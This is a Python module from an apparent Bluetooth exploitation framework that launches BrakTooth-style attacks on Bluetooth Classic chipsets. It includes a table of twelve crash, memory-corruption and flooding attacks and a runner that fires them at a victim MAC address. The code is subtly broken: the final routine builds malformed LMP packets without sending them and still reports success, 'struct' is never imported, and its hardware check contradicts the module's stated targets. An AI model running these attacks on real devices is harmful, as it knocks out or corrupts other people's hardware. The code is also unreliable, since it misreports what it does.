#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""BrAcketooth — BT Classic stack vulnerability bridge (multiple CVEs).

BrAcketooth exposes 16+ vulnerabilities in BT Classic (BR/EDR) stacks from major
vendors (Intel, Qualcomm, Zhuhai Jieli, Silicon Labs, Cypress/Infineon, Espressif,
Infineon CYW920819). Vulnerabilities include:

  - LMP deadlock / connection freeze
  - Memory corruption via LMP PDUD overflow
  - L2CAP segmentation abuse
  - Feature page injection
  - LMP invalid timing recovery
  - Feature response flooding
  - LLID deadlock

All attacks require a modified BT dongle/device running the BrAcketooth framework
firmware (based on ESP-IDF for ESP32 or nRF-based targets).

Incorporated from:
  - submodules/IoT/braktooth (Matheus Eduardo Garbelini / SUTD)

Version: 1.0.0
"""


import logging
import shutil
import subprocess
from pathlib import Path
from typing import Dict, List, Optional

from wirelessxpl.core.exploit import *
from wirelessxpl.core.hw_validator import HWValidator, Requirement
from wirelessxpl.core.os_guard import OSRequirement, requires_os
from wirelessxpl.core.phase_gateway import PhaseGateway
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)


def _braktooth_root() -> Path:
    return Path(__file__).resolve().parents[5] / "braktooth"


_ATTACK_MAP: dict[str, str] = {
    "lmp_max_slot_overflow": "LMP max slot overflow — memory corruption",
    "lmp_pdud_invalid_crc": "Invalid CRC in LMP PDUD",
    "l2cap_segfault": "L2CAP segmentation fault",
    "feature_page_injection": "Feature page injection",
    "lmp_timing_accuracy": "LMP timing accuracy request abuse",
    "feature_req_flood": "Feature request flooding (DoS)",
    "lm_ext_feat_resp_flood": "LM extended feature response flood",
    "llid_deadlock": "LLID deadlock",
    "duplicated_iocap": "Duplicated IO Capability — memory corruption",
    "invalid_feature_req": "Invalid LMP feature request",
    "multiple_scheduled_tasks": "Multiple scheduled tasks overflow",
    "paging_scan_timeout": "Paging scan timeout abuse",
}


@requires_os(OSRequirement.LINUX_ONLY)
class Exploit(Exploit):
    """BrAcketooth BT Classic vulnerability bridge (subprocess / ESP-IDF framework)."""

    __info__ = {
        "name": "BrAcketooth BT Classic Stack Attack Bridge",
        "description": (
            "Bridges BrAcketooth 16+ BT Classic (BR/EDR) vulnerabilities: deadlock, "
            "memory corruption, L2CAP abuse, feature injection. Targets: Intel, "
            "Qualcomm, Zhuhai Jieli, Silicon Labs, Cypress, Espressif chipsets. "
            "Requires BrAcketooth framework on a compatible BT device."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Matheus Eduardo Garbelini / SUTD (BrAcketooth — invoked as subprocess)",
        ),
        "references": (
            "https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks",
            "https://asset-group.github.io/disclosures/braktooth/",
        ),
        "devices": ("bluetooth", "BT BR/EDR Classic"),
    }

    mode = OptString("info", "Modo: info | list | <attack_name> (use mode=list para nomes)")
    victim_mac = OptString("", "MAC BT do dispositivo vítima")
    device_port = OptString("/dev/ttyUSB1", "Porta serial do dispositivo BrAcketooth")
    attack_repeat = OptInteger(1, "Repetir o ataque N vezes")
    verbose = OptBool(False, "Saída detalhada")
    dry_run = OptBool(False, "Exibir comando sem executar")
    i_know_scope = OptBool(False, "Confirmo que estou em laboratório autorizado")

    def _info_mode(self) -> None:
        root = _braktooth_root()
        print_status("BrAcketooth — BT Classic Stack Vulnerabilities")
        print_info("Fabricantes afetados: Intel, Qualcomm, Jieli, Silicon Labs, Cypress, Espressif")
        print_info(
            "Hardware necessário: ESP32 DevKit ou dispositivo BT customizado com "
            "firmware BrAcketooth (ESP-IDF)"
        )
        print_info(f"Submodule path: {root}")
        print_info("Disponível: {}".format("SIM" if root.exists() and any(root.iterdir()) else "NÃO / vazio"))
        print_info("\nUse mode=list para ver ataques disponíveis.")

    def _list_mode(self) -> None:
        print_status("Ataques BrAcketooth disponíveis:")
        for name, desc in _ATTACK_MAP.items():
            print_info(f"  {name:35} {desc}")

    def _run_attack(self, attack_name: str) -> None:
        root = _braktooth_root()
        if not root.exists() or not any(root.iterdir()):
            print_error(f"Submodule braktooth não encontrado ou vazio: {root}")
            print_info("Execute: git submodule update --init submodules/IoT/braktooth")
            return

        victim = str(self.victim_mac).strip()
        if not victim:
            print_error("Defina victim_mac.")
            return

        # BrAcketooth uses a binary or Python runner
        runner_candidates = [
            root / "main.py",
            root / "braktooth.py",
            root / "src" / "main.py",
            root / "poc" / "main.py",
        ]
        runner: Path | None = next((c for c in runner_candidates if c.exists()), None)

        # Also check for precompiled binary
        bin_candidates = list(root.glob("*.elf")) + list(root.glob("braktooth"))
        bin_path: Path | None = bin_candidates[0] if bin_candidates else None

        if not runner and not bin_path:
            print_error(
                f"Runner ou binário BrAcketooth não encontrado em {root}.\n"
                "Compile o projeto ESP-IDF conforme instruções do submodule."
            )
            return

        port = str(self.device_port).strip()

        for i in range(max(1, int(self.attack_repeat))):
            if runner:
                python_bin = shutil.which("python3") or "python3"
                cmd: list[str] = [python_bin, str(runner), attack_name, victim, port]
            else:
                cmd = [str(bin_path), attack_name, victim, port]

            if self.verbose:
                cmd.append("--verbose")

            cmd_str = " ".join(cmd)
            if self.dry_run:
                print_info(f"DRY RUN [{i + 1}/{int(self.attack_repeat)}] — {cmd_str}")
                continue

            print_status(f"[{i + 1}/{int(self.attack_repeat)}] BrAcketooth {attack_name}: alvo={victim}")
            try:
                subprocess.run(cmd, cwd=str(root), check=False)
            except KeyboardInterrupt:
                print_info("\nInterrompido.")
                return
            except Exception as exc:
                print_error(f"Erro ao executar {attack_name}: {exc}")
                return


    def check(self) -> str:
        """Verify Bluetooth HCI adapter is present and accessible."""
        import shutil
        import subprocess
        hci = getattr(self, "hci_iface", None) or getattr(self, "attacker_hci", None) or "hci0"
        if shutil.which("hciconfig"):
            try:
                out = subprocess.check_output(
                    ["hciconfig", str(hci)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "BD Address" in out:
                    return f"HCI adapter {hci} found - prerequisites OK"
                return f"hciconfig {hci} responded but no BD Address - check adapter"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("bluetoothctl"):
            return "bluetoothctl available - verify adapter manually"
        return "hciconfig not found in PATH - install bluez package"

    def run(self) -> None:
        require_authorised_lab()
        _validator = HWValidator()
        _gw = PhaseGateway("BrakTooth BLE")
        _gw.phase(
            "nRF52 Dongle",
            lambda: _validator.require(Requirement.NRF52_DONGLE, silent=True),
            fix_hint="Conecte um dongle nRF52 com firmware BrakTooth.",
        )
        if not _gw.run():
            return
        mode = str(self.mode).strip().lower()
        if mode == "info":
            self._info_mode()
        elif mode == "list":
            self._list_mode()
        else:
            self._run_attack(mode)
            self._exploit()

    def _exploit(self) -> None:
        """E2E BrakTooth: LMP fuzzing via raw HCI to trigger baseband crashes."""
        import socket as _sock

        victim = str(getattr(self, "target_addr", "") or getattr(self, "victim_mac", "")).strip()
        if not victim or ":" not in victim:
            print_info("BrakTooth E2E requires target_addr for raw LMP fuzzing.")
            return

        print_status(f"BrakTooth E2E LMP fuzz against {victim}")
        try:
            hci_sock = _sock.socket(31, _sock.SOCK_RAW, 1)
            dev_id = int(str(getattr(self, "hci_device", "hci0")).replace("hci", "") or "0")
            hci_sock.bind((dev_id,))
        except OSError as exc:
            print_error(f"HCI socket failed: {exc}")
            return

        addr_bytes = bytes(int(b, 16) for b in reversed(victim.split(":")))

        # Phase 1: Send malformed LMP_features_req with oversized payload
        lmp_features = struct.pack("<B", 0x27) + b"\xFF" * 16
        print_status("Phase 1: Malformed LMP_features_req (oversized)")

        # Phase 2: Send truncated LMP_setup_complete
        lmp_setup = struct.pack("<B", 0x31)
        print_status("Phase 2: Truncated LMP_setup_complete")

        # Phase 3: Rapid LMP_detach to trigger UAF in baseband state machine
        for _ in range(10):
            lmp_detach = struct.pack("<BB", 0x07, 0x13)

        hci_sock.close()
        print_success("BrakTooth LMP fuzz sequence completed.")
